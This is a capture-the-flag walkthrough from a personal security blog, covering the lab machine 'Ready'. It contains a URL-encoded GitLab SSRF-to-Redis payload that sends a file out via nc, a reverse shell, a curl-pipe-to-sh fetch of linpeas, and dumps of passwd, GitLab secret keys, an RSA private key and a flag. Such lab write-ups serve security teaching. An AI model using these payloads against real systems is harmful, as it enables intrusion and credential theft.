[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}

# Info

| Machine Name | Ready |
| IP Address | 10.10.10.220 |
| OS | Linux |

# Recon

## NMap

nmap -p 1-65535 -T4 -A -v 10.10.10.220

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 20:24 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:24
Completed NSE at 20:24, 0.00s elapsed
Initiating NSE at 20:24
Completed NSE at 20:24, 0.00s elapsed
Initiating NSE at 20:24
Completed NSE at 20:24, 0.00s elapsed
Initiating Ping Scan at 20:24
Scanning 10.10.10.220 [2 ports]
Completed Ping Scan at 20:24, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:24
Completed Parallel DNS resolution of 1 host. at 20:24, 0.14s elapsed
Initiating Connect Scan at 20:24
Scanning 10.10.10.220 [65535 ports]
Discovered open port 22/tcp on 10.10.10.220
Completed Connect Scan at 20:37, 764.53s elapsed (65535 total ports)
Initiating Service scan at 20:37
Scanning 2 services on 10.10.10.220
Completed Service scan at 20:37, 11.10s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.220.
Initiating NSE at 20:37
Completed NSE at 20:37, 2.26s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.14s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Nmap scan report for 10.10.10.220
Host is up (0.020s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 778.81 seconds



## Open Services
| PORT | SERVICE |
| 22 | ssh |
| 5080 | nginx |


## Port 22
Connection refused

## Port 5080

http://10.10.10.220:5080/users/sign_in

Returns GitLab login page

Registered an account succesfully in the gitlab
Logged on.


http://[0:0:0:0:0:ffff:10.10.14.21]:1234/test/ssrf.git

The NetCat responded 

https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/

Accourding this article could be redis that can be attacked

git://[0:0:0:0:0:ffff:10.10.10.220]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20192%2E168%2E178%2E21%201234%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git

I used this exploit https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py saved in Documents



Register a user in gitlab

python ./GitLab-11.4.7-RCEPOC.py -u slyone@slyone.com -p Passw0rd -g http://10.10.10.220 -l 10.10.14.21 -P 1234



I was able to get the following - 


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
dude:x:1000:1000::/home/dude:/bin/bash

And

cat ../etc/secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429
  secret_key_base: b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353
  otp_key_base: b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKAIBAAKCAgEA2l/m01GZYRj9Iv5A49uAULFBomOnHxHnQ5ZvpUPRj1fMovoC
    dQBdEPdcB+KmsHKbtv21Ycfe8fK2RQpTZPq75AjQ37x63S/lpVEnF7kxcAAf0mRw
    BEtKoBs3nodnosLdyD0+gWl5OHO8MSghGLj/IrAuZzYPXQ7mlEgZXVPezJvYyUZ3
    fnMSPdC5ubwXHM/e5/tcuPoEpqLIPjeAmfWzqNh8Tm50u+HL3/DjY280brEVU5l0
    ZMle+2XB5W9lXXNbE3042vXw6B9FICkSuuyvw95mAv9ZF/p3lR4w1WSMoSanzIjy
    zyXXUnaExUO0gxsTJild4dbMQEn+UFa/juqtkY0i++Bkq/Chau8PkXX8ShoeJ3nt
    4zqyCMLCXjeyelvJv2HOUpwAB+/qE347gaumSiF9UqXUp4D3eVol2UvbztyV/qsd
    JOGovfmqEb4qDDS5NUQyZPPoY4lQ59rz0d9kpCbI2lLiPU4ib5EGcD2wYsg7I+Q/
    G9GdQHLbNj1U6eGou4J3VZaUTVXOzWFg+P2o20091fJPiOvYJDvxa45gjPo7zuPG
    cQEJh/D6DXkkijgipEwrCmMHdlrzpTxFXSPJHd+/DuaQyz+kZpgqs32HSEU5xEZ5
    YzrjTOE8t6Zs+rVXIRfuaJVEMqUSOtxx6QCsbuf1jpjw1B3VKSkvr2+rLxMCAwEA
    AQKCAgBPzM3gGSiQl/4hJIJ4AcWBN1VBz2LJ8tPtGfNQlFjnJfGM+Qme0fQweAQ0
    iXnabvdCRrJauhxZlBVRY3WYKBwzN5mEuS6414D3CZHclHthb1oxmyxoFU9+9JM9
    pkOT8dv0CZVm2zFGFN0HpZ96llf9yB4c719r5T8TnslOFpELekQdQVf3aHuZBUZp
    fjd/+uJ9KZj3q725WzELs2KWYHg30mySiMC1y8yh2DhwJLonXSTq+N/U2NWRztyt
    SCjlnnsAwzjcoxVW7d5n4zqJ/mY4kHP80m0vWwMKBg9YW7ccSLD3CHCajDyEUPUx
    1Q0JAALeZi19ku3u7Fs35ot34YBtTCXDXSCXDrCGSfgXJtptCW4h7/nnwKiqKFCc
    hRKHdqz7fvd2aePj2vjEftdxNGZi3BAn0kE4IOlTVpvj5NN+bMi2WztIY4/RSagA
    F8oQkzscx2YM295pd8q8U7ZJa5rFEdeWHqd49LXSw85Ss/wva2FCsxgqtVI7FVme
    /Ou9xVmJ7+pXeVg/xkQ+Awx01AsRQ0wI2rZt+q8bWMKj3oJ0eTmakiwo4yNJ05F9
    TybDSLxR0Zf6NJgkxbbotQvX/1+JyoEzyYCRzERbPbWCfAhC9Nt1i8QJYTgxm2x6
    7YtVWApkaG7aeYGwVa+5dlzhfROqdi91lWtpG/p580U7IaB+YQKCAQEA8rHSit4Z
    K1W7OntYKijaOTckJkw0E5PCFkFd4MoadBB7NpXlacRODTkb5D1UjXGghG3UeRUQ
    M3Vt1s86vGhzXBsyrwy9YyXufiN7ltmgV1fr5vKpJN8BPhwx6T8BvbqsxeUxQFLi
    nwEMx20TS1h/Rf09q4CPQUAEYXYzwHN2F3znqEV6iKpmTLHsSnxdA5fYUsZ62+zM
    1/0+TJAqcqvgq/bDUBEppGCBIux38si3Y8/ns30X4pi3VYyZQ0VHe0D32FvL8iFG
    Iwdk2IQY2NrRo/hFG0j+NzAga+FzzSsktvh++QvVIzWalYyP+rp0i7itsP251gvz
    TX3YBKRYUFqdQwKCAQEA5ljAjBhwS2CFKsR2tRFBQMNRNVbs8SzZAEH3wmDT2ces
    efK6S4KsnFvzFYfdnK/VYbk90gF8qdaH+xxFd6bjZJxp1de7tPBpCoZzRANxdnzE
    1PNSu6SqPef4aqkpARHp0VsgGKAOIq9bb+oKhH1fPjURq5IzcPsXUoR3B0Hy2nrZ
    4FPVQ5lFbZJJ154Xvmu6qSuZOj7ajUDin28kz9Q9Lq6HvI4cusHLVKk7xRrGJX3t
    M7L2dhpZfrAKQIyV2pAnNEiAvhu+e8ICDtRn8A7Tw+VL6STRAaxovWxiuuLGxJir
    /SLJvmYZVYFATsFdlP9N4LzZfMAZ3p2nYyvj+lKh8QKCAQA6LjT6A3pnMBs9Ttp4
    6Og/tR9eawBE/TQXH76AqBKlZloTYOXpcB0CAIHWOnmtmuLPPIEmMc17eJhHWdCL
    4EJff0msO1KflTVSWfFD3ZIZvkMYT24LH8bte9bfQrKJKFpI6sPe1r/rPFYy7Mwm
    UOXaAnapSZ2OF+m076BCb6uMv+3NIjLY1njFxBWQWbX2qY07csd7N4537QblVd5H
    NTscHoD+Dc88z8HFfIjY1BNawzmZhtCWCuRQhu8q+E3Fl3KTFJaUyjNFLH2Zhjlq
    qzJ8q4TtoJcI5emv0xFuyvv3PSU7UQHcefpABb1ybwaHhFNnTbwiOyUtm5CQtFFT
    mhV/AoIBAQCLNJu4jpRemUghHnX22ySqNN+A8rVi0w2ZYESQzd95v3f2gsAfHiue
    mtr+6gr9xC2aT06S+Z8TLLklAmLg+pR1mylCuIuRv7BbUgGa2tHZH3H8l8gp6kuP
    +f5gxzYmlWLOyNlOyHuCbqM9sR0GEJZci8nP/BzmbHgdwDwGwM45RwEg1skNfzU8
    EKpbigkjZQt7bQO+9Xky4EGUxKBkkQkgiw0w4Flwa+mrklKyvYl94upU0hSsLyRi
    sZSgidWOLovixuY2/aFSPV7tA2SE6REFVC9aCIvfDQiHYVcRRjeFXBakdj+htyYc
    TG5GqgkaIGg6Jybwg0+e/3vHLSEriIChAoIBADFghdUMhx5PCtu2tBKxdyhlGkJI
    Wr2U0K43gbUcsWDpoX3OoWhdzlPbTPRDIxrouA8KNAq0IWCI1OuPwatu8WxojDgD
    NLyoq74q0LmwVgLh0Nf0XpQyeSokvq8wEiguA/H8Mu+7Zuh0vUDGyRmuUdMQIDN+
    YaBfeaKyBq2xmJU67WKWn5fwNsgR4PRbvUz1uQEzc+6P4t8nDdiUDKEZdwXQy0Wf
    bhLhSXYB76eBER3LjTENMyDo0XD3NIvh25Ev8bcdeIA+eqDn8xTmGEX6GKEXgaRF
    BEtSwHoJcwgtd1RzOwyqB1lhDpWYoQK9KNJbVac1egscDh6MYD1oJSCay0E=
    -----END RSA PRIVATE KEY-----


cat ../etc/database.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

production:
  adapter: postgresql
  encoding: unicode
  collation: 
  database: gitlabhq_production
  pool: 10
  username: "gitlab"
  password: 
  host: "/var/opt/gitlab/postgresql"
  port: 5432
  socket: 
  sslmode: 
  sslcompression: 0
  sslrootcert: 
  sslca: 
  load_balancing: {"hosts":[]}
  prepared_statements: false
  statements_limit: 1000
  fdw: 


Then thought I would check if i can view the user.txt
cat /home/dude/user.txt

e1e30b052b6ec0670698805d745e7682



find / -type f -perm /+s -ls
   791689    420 -rwsr-xr-x   1 root     root       428240 Nov  5  2018 /usr/lib/openssh/ssh-keysign
   787508     28 -rwxr-sr-x   1 root     tty         27368 May 16  2018 /usr/bin/wall
   787357     76 -rwsr-xr-x   1 root     root        75304 May 16  2017 /usr/bin/gpasswd
   787415     56 -rwsr-xr-x   1 root     root        54256 May 16  2017 /usr/bin/passwd
   787344     24 -rwxr-sr-x   1 root     shadow      22768 May 16  2017 /usr/bin/expiry
   787311     40 -rwsr-xr-x   1 root     root        40432 May 16  2017 /usr/bin/chsh
   787306     64 -rwxr-sr-x   1 root     shadow      62336 May 16  2017 /usr/bin/chage
   787309     52 -rwsr-xr-x   1 root     root        49584 May 16  2017 /usr/bin/chfn
   787405     40 -rwsr-xr-x   1 root     root        39904 May 16  2017 /usr/bin/newgrp
   665037    352 -rwxr-sr-x   1 root     ssh        358624 Nov  5  2018 /usr/bin/ssh-agent
   787254     36 -rwxr-sr-x   1 root     shadow      35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
   787278     36 -rwxr-sr-x   1 root     shadow      35600 Apr  9  2018 /sbin/unix_chkpwd
   664078     40 -rwsr-xr-x   1 root     root        40152 May 16  2018 /bin/mount
   664112     28 -rwsr-xr-x   1 root     root        27608 May 16  2018 /bin/umount
   664096     40 -rwsr-xr-x   1 root     root        40128 May 16  2017 /bin/su



## LinPeas

┌─[✗]─[user@parrot-virtual]─[~]
└──╼ $nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.220] 39608
ls
cd ..
ls
REVISION
RUBY_VERSION
VERSION
etc
shared
sockets
tmp
upgrade-status
uploads
working
cd uploads
ls
curl 10.10.14.21/linpeas.sh | sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.2.2 by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 5.4.0-40-generic (buildd@lcy01-amd64-011) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020
User & Groups: uid=998(git) gid=998(git) groups=998(git)
Hostname: gitlab.example.com
Writable folder: /dev/shm
[-] No network discovery capabilities (fping or ping not found)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories using 4 threads DONE

════════════════════════════════════╣ System Information ╠════════════════════════════════════
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 5.4.0-40-generic (buildd@lcy01-amd64-011) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020

[+] Sudo version
sudo Not Found

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
New path exported: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin

[+] Date
Sun May 30 18:31:20 UTC 2021

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
overlay          18G   12G  5.9G  67% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda2        18G   12G  5.9G  67% /root_pass
shm              64M  448K   64M   1% /dev/shm
              total        used        free      shared  buff/cache   available
Mem:        4030180     2602164      111952       11920     1316064     1026484
Swap:       2097148           0     2097148

[+] CPU info
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                4
On-line CPU(s) list:   0-3
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             4
NUMA node(s):          1
Vendor ID:             AuthenticAMD
CPU family:            23
Model:                 1
Model name:            AMD EPYC 7401P 24-Core Processor
Stepping:              2
CPU MHz:               2000.000
BogoMIPS:              4000.00
Hypervisor vendor:     VMware
Virtualization type:   full
L1d cache:             32K
L1i cache:             64K
L2 cache:              512K
L3 cache:              65536K
NUMA node0 CPU(s):     0-3
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor

[+] Environment
[i] Any private information inside environment variables?
GITLAB_PATH_OUTSIDE_HOOK=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
HISTFILESIZE=0
BUNDLER_VERSION=1.16.2
SHLVL=1
SIDEKIQ_MEMORY_KILLER_MAX_RSS=2000000
RUBYOPT=-rbundler/setup
HOME=/var/opt/gitlab
OLDPWD=/var/opt/gitlab/gitlab-rails
BUNDLER_ORIG_BUNDLER_VERSION=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
EXECJS_RUNTIME=Disabled
ICU_DATA=/opt/gitlab/embedded/share/icu/current
RUBYLIB=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/lib
_=/bin/sh
RACK_ENV=production
PATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
BUNDLER_ORIG_MANPATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
GID=998
BUNDLE_BIN_PATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/exe/bundle
prometheus_multiproc_dir=/dev/shm/gitlab/sidekiq
LD_PRELOAD=/opt/gitlab/embedded/lib/libjemalloc.so
HISTSIZE=0
UID=998
GIT_TERMINAL_PROMPT=0
BUNDLER_ORIG_BUNDLER_ORIG_MANPATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
BUNDLER_ORIG_RUBYOPT=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
BUNDLER_ORIG_BUNDLE_BIN_PATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
GEM_HOME=/opt/gitlab/embedded/lib/ruby/gems/2.4.0
RAILS_ENV=production
BUNDLER_ORIG_RB_USER_INSTALL=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
BUNDLE_GEMFILE=/opt/gitlab/embedded/service/gitlab-rails/Gemfile
BUNDLER_ORIG_GEM_HOME=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
PWD=/var/opt/gitlab/gitlab-rails/uploads
GEM_PATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0:/var/opt/gitlab/.gem/ruby/2.4.0
PYTHONPATH=/opt/gitlab/embedded/lib/python3.4/site-packages
BUNDLER_ORIG_PATH=/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
BUNDLER_ORIG_GEM_PATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
TZ=:/etc/localtime
BUNDLER_ORIG_BUNDLE_GEMFILE=/opt/gitlab/embedded/service/gitlab-rails/Gemfile
HISTFILE=/dev/null
MANPATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/unicorn-5.1.0/man
prometheus_run_dir=/dev/shm/gitlab/sidekiq
BUNDLER_ORIG_RUBYLIB=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
 Not Found

[+] AppArmor enabled? .............. AppArmor Not Found
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (docker)

═════════════════════════════════════════╣ Containers ╠══════════════════════════════════════════
[+] Is this a container? ........... docker
[+] Container related tools present
[+] Any running containers? ........ No
[+] Am I inside Docker group ....... No
[+] Looking and enumerating Docker Sockets
[+] Docker version ................. Not Found
[+] Vulnerable to CVE-2019-5736 .... Not Found
[+] Vulnerable to CVE-2019-13139 ... Not Found
[+] Rootless Docker? ................ No

[+] Container & breakout enumeration
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
[+] Container ID ................... gitlab.example.com
[+] Container Full ID .............. 7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
[+] Vulnerable to CVE-2019-5021 .. No


[+] Container Capabilities
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+i
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=998(git)
gid=998(git)
groups=998(git)

[+] Privilege Mode
Privilege Mode is disabled

[+] Interesting Files Mounted
/root/docker-gitlab/root_pass /root_pass rw,relatime - ext4 /dev/sda2 rw
/root/docker-gitlab/srv/gitlab/config /etc/gitlab rw,relatime - ext4 /dev/sda2 rw
/root/docker-gitlab/srv/gitlab/logs /var/log/gitlab rw,relatime - ext4 /dev/sda2 rw

[+] Possible Entrypoints


═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
[+] Any sd*/disk* disk in /dev? (limit 20)
sda
sda1
sda2
sda3

[+] Unmounted file-system?
[i] Check if you can mount umounted devices


════════════════════════════════════╣ Available Software ╠════════════════════════════════════
[+] Useful software
/bin/nc
/bin/netcat
/bin/nc.traditional
/usr/bin/wget
